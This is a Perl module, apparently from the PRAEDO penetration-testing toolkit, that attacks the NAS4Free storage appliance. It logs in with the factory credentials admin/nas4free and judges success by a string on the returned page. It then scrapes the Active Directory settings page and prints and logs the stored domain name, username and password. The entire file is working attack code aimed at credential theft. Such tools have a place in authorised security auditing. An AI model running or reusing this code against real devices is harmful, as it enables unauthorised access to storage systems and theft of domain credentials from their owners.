# NAS4FREE software appliance-  default password check  
# 
######################################################
#                  PRAEDO Module #MA0026             #
#                   Copyright (C) 2015 	             #
#              Deral Heiland    "Percent_x"          # 
######################################################
package MA0026;
sub MA0026
{
 
# Set global variables
my $TARGET = $_[1];
my $PORTS = $_[2];
my $web = $_[3];
my $OUTPUT = $_[4];
my $LOGFILE = $_[5];


# Open output file and setup browser LWP function 
open(OUTFILE, ">>./$OUTPUT/$LOGFILE.log") || die("Failed to open  Output file $LOGFILE.log \n");
print "\n**********Attempting to Verify default credentials on NAS4Free Software Appliance  $TARGET : JOB MA0026**********\n";
print OUTFILE "\n**********Attempting to Verify default credentials on NAS4Free Software Appliance $TARGET : JOB MA0026**********\n";

my $browser = LWP::UserAgent->new(timeout => 15);
my $response = new HTTP::Request GET =>"http://$TARGET:$PORTS/";


# Setup cookie and place in cookie jar
 $cookie_jar = HTTP::Cookies->new();
 my $browser = LWP::UserAgent->new(timeout => 120);
 $browser->cookie_jar($cookie_jar);

# enable redirect handeling for POST process
 push @{ $browser->requests_redirectable }, 'POST';

# Test  For Default Password
my $response = $browser->post("http$web://$TARGET/login.php",
[
"username" => "admin",
"password" => "nas4free",
]);
my $content = $response->content();

if ($content =~ /BitTorr/)
        {
            print "$TARGET : SUCCESS : username=admin : password=nas4free\n";
            print OUTFILE "$TARGET : SUCCESS : username=admin : password=nas4free\n";

# check active directory settings
            $response = $browser->get("http$web://$TARGET/access_ad.php",);
            $content = $response->content();
			 my $html = HTML::TagParser->new($content);
                	 my @list = $html->getElementsByTagName( "input" );
                       	 foreach my $elem ( @list )
                                {
                                 my $text1 = $elem->getAttribute("name");
                                 my $text2 = $elem->getAttribute("value");
                                    if (($text1 =~ /domainname_netbios/) && ($text2 ne //))
                                        {
                                           print "Active Directory Domain Name = $text2\n";
                                           print OUTFILE "Active Directory Domain Name = $text2\n";
                                        }
                                    elsif (($text1 =~ /username/) && ($text2 ne //))
                                        {
                                           print "Active Directory Username = $text2\n";
                                           print OUTFILE "$TARGET:SUCCESS:Active Directory Username = $text2:\n";
                                        }
                                    elsif (($text1 =~ /password/) && ($text2 ne //))
                                        {
                                           print "Active Directory Password = $text2\n";
                                           print OUTFILE "$TARGET:SUCCESS::Active Directory Password = $text2\n";
                                        }


                                    else
                                        {
                                        }
                                }
        }

        else 
        { 
	   print "FAILED \n";
	   print OUTFILE "FAILED \n";
        } 


                   

# operation completed close out output files
close(OUTFILE);

}
		
1;
